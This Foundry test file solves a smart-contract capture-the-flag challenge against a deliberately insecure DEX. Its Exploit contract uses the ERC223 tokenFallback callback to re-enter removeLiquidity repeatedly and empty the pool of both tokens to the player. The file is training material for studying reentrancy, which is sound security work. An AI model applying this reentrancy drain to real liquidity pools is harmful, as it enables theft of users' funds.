// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";

import {SimpleERC223Token} from "../src/tokens/tokenERC223.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";


contract Challenge2Test is Test {
    InsecureDexLP target; 
    IERC20 token0;
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        
        token0 = IERC20(new InSecureumToken(10 ether));
        token1 = IERC20(new SimpleERC223Token(10 ether));
        
        target = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(target), type(uint256).max);
        token1.approve(address(target), type(uint256).max);
        target.addLiquidity(9 ether, 9 ether);

        token0.transfer(player, 1 ether);
        token1.transfer(player, 1 ether);
        vm.stopPrank();

        vm.label(address(target), "DEX");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "SimpleERC223Token");
    }

    function testChallenge() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/      
        Exploit attacker = new Exploit(address(token0), address(token1), address(target), address(player));
        token0.approve(address(attacker), token0.balanceOf(address(player)));
        token1.approve(address(attacker), token0.balanceOf(address(player)));
        token0.transfer(address(attacker), token0.balanceOf(address(player)));
        token1.transfer(address(attacker), token1.balanceOf(address(player)));
        console.log("balance token0 attacker",token0.balanceOf(address(attacker)));
        console.log("balance token1 attacker",token1.balanceOf(address(attacker)));
        attacker.pwn();
        //============================//

        vm.stopPrank();

        assertEq(token0.balanceOf(player), 10 ether, "Player should have 10 ether of token0");
        assertEq(token1.balanceOf(player), 10 ether, "Player should have 10 ether of token1");
        assertEq(token0.balanceOf(address(target)), 0, "Dex should be empty (token0)");
        assertEq(token1.balanceOf(address(target)), 0, "Dex should be empty (token1)");

    }
}



/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/


contract Exploit {
    IERC20 public token0; // this is insecureumToken
    IERC20 public token1; // this is simpleERC223Token
    InsecureDexLP public dex;

    address player;
    uint256 amountLP;
    bool allowReentrancy;
    constructor(address _token0, address _token1, address _dex, address _player){
        token0 = IERC20(_token0);
        token1 = IERC20(_token1);
        dex = InsecureDexLP(_dex);
        player = _player;
        token0.approve(address(dex),type(uint256).max);
        token1.approve(address(dex),type(uint256).max);
        token0.approve(player,type(uint256).max);
        token1.approve(player,type(uint256).max);
    }

    function pwn() external{
        allowReentrancy=true;
        dex.addLiquidity(token0.balanceOf(address(this)), token1.balanceOf(address(this)));
        amountLP = dex.balanceOf(address(this));
        dex.removeLiquidity(amountLP);

    }

    function tokenFallback(address _dex,uint256 amount,bytes memory data) external{
        //reentrancy due to ERC223

        //first transfer player -> attacker
        if (!allowReentrancy){
            return;
        }
        //transfer dex -> attacker
        if((token0.balanceOf(address(dex)) == 0) && (token1.balanceOf(address(dex)) == 0) ){
            token0.transfer(player,token0.balanceOf(address(this)));
            token1.transfer(player,token1.balanceOf(address(this)));
            return;
        }
        dex.removeLiquidity(amountLP);
    }
}